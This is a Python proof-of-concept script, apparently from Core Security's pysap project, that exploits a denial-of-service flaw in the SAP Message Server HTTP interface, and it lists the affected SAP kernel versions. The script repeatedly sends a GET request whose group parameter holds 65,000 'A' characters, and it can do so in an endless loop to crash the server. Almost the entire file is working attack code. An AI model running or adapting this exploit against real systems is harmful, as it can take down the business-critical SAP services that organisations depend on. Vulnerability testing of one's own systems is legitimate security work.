#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2012-2017 by Martin Gallo, Core Security
#
# The vulnerability had found by Mathieu Geli
# PoC by Vahagn Vardanyan
#
# The library was designed and developed by Martin Gallo from the Security
# Consulting Services team of Core Security.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

"""
Vulnerable SAP Kernel versions

SAP KERNEL 7.21 32-BIT UNICODE
SAP KERNEL 7.21 32-BITSP716
SAP KERNEL 7.21 64-BIT UNICODE
SAP KERNEL 7.21 64-BITSP716
SAP KERNEL 7.21 EXT 32-BIT
SAP KERNEL 7.21 EXT 32-BIT UC
SAP KERNEL 7.21 EXT 64-BIT
SAP KERNEL 7.21 EXT 64-BIT UC
SAP KERNEL 7.22 64-BIT
SAP KERNEL 7.22 64-BIT UNICODE
SAP KERNEL 7.22 EXT 64-BIT
SAP KERNEL 7.22 EXT 64-BIT UC
SAP KERNEL 7.42 64-BIT
SAP KERNEL 7.42 64-BIT UNICODE
SAP KERNEL 7.45 64-BIT
SAP KERNEL 7.45 64-BIT UNICODE
SAP KERNEL 7.49 64-BIT UNICODE

"""

# Standard imports
import logging
from time import sleep
from socket import error as SocketError
from optparse import OptionParser, OptionGroup
# External imports
from scapy.packet import Raw
from scapy.config import conf
import requests
# Custom imports
import pysap


# Set the verbosity to 0
conf.verb = 0


# Command line options parser
def parse_options():

    description = "This example script can be used to tests against %I waiting CVE% Denial of Service vulnerability" \
                  "affecting the Message Server. For more details about the vulnerability see Advisory " \
                  "https://erpscan.com/advisories/erpscan-16-038-sap-message-server-http-remote-dos/."

    epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
                                                         "url": pysap.__url__,
                                                         "repo": pysap.__repo__}

    usage = "Usage: %prog [options] -d <remote host>"

    parser = OptionParser(usage=usage, description=description, epilog=epilog)

    target = OptionGroup(parser, "Target")
    target.add_option("-d", "--remote-host", dest="remote_host",
                      help="Remote host")
    target.add_option("-p", "--remote-port", dest="remote_port", type="int", default=8101,
                      help="Remote port [%default]")
    target.add_option("--route-string", dest="route_string",
                      help="Route string for connecting through a SAP Router")
    parser.add_option_group(target)

    misc = OptionGroup(parser, "Misc options")
    misc.add_option("-l", "--loop", dest="loop", action="store_true", default=False,
                    help="Loop until the user cancel (Ctrl+C) [%default]")
    misc.add_option("-n", "--number", dest="number", type="int", default=10,
                    help="Number of packets to send [%default]")
    misc.add_option("-t", "--time", dest="delay", type="int", default=5,
                    help="Time to wait between each round [%default]")
    misc.add_option("-v", "--verbose", dest="verbose", action="store_true", default=False,
                    help="Verbose output [%default]")
    misc.add_option("--terminal", dest="terminal", default=None,
                    help="Terminal name")
    parser.add_option_group(misc)

    (options, _) = parser.parse_args()

    if not (options.remote_host or options.route_string):
        parser.error("Remote host or route string is required")

    return options

def send_crash(host, port, item, verbose, route=None):
    # Create the connection to the SAP Netweaver server
    if verbose:
        print("[*] Sending crash")
    # Initiate the connection
    try:
        requests.get(host+":"+str(port)+item)
    except:
        pass

# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    print("[*] Testing Message Server DoS vulnerability on host %s:%d" % (options.remote_host,
                                                                                        options.remote_port))

    # Crafting the item

    item = "/msgserver/html/group?group="+'A'*65000

    try:
        if options.loop:
            try:
                while True:
                    send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)
                    sleep(options.delay)
            except KeyboardInterrupt:
                print("[*] Cancelled by the user")
        else:
            for i in range(options.number):
                send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)
                sleep(options.delay)

    except SocketError:
        print("[*] Connection error, take a look at the enqueue server process !")


if __name__ == "__main__":
    main()
